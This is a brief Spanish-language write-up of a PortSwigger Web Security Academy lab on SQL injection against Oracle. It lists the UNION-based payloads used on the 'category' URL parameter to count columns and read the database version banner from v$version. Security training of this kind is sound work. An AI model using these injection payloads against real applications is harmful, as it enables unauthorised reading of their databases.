# SQL Injection - Querying Database Type and Version on Oracle

* **Plataforma:** PortSwigger Web Security Academy
* **Dificultad:** Practitioner
* **Objetivo** Mostrar la version de la base de datos Oracle

## Pasos
1. Identifiqué el parametro vulnerable: `category`en la URL.
2. Determiné el numero de columnas con `'ORDER BY 1--`, `'ORDER BY 2--`...
3. Confirmé que ambas columnas aceptan textos con `'UNION SELECT 'a', 'a' FROM dual--`.
4. Extraje la version con `' UNION SELECT banner, NULL FROM v$version--`.

## Resultado
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
<img width="1163" height="410" alt="image" src="https://github.com/user-attachments/assets/d60431d6-d2d4-4d37-88ac-7e76f0671f2f" />
